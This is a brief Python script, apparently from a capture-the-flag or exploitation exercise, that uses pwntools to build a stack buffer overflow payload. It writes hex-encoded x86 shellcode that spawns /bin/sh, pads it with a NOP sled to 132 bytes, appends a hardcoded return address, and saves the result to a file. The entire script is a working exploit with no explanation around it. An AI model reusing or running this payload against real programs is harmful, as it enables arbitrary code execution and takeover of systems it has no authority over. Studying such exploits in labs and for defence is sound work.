from pwn import *
add = 0xffffd840
b = "6a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a0b58cd80"
b = bytes.fromhex(b)
a = b"\x90"*(132-len(b))
a +=b

a += p32(add)
print(a)
f = open("bruh","wb")
f.write(a)
f.close()
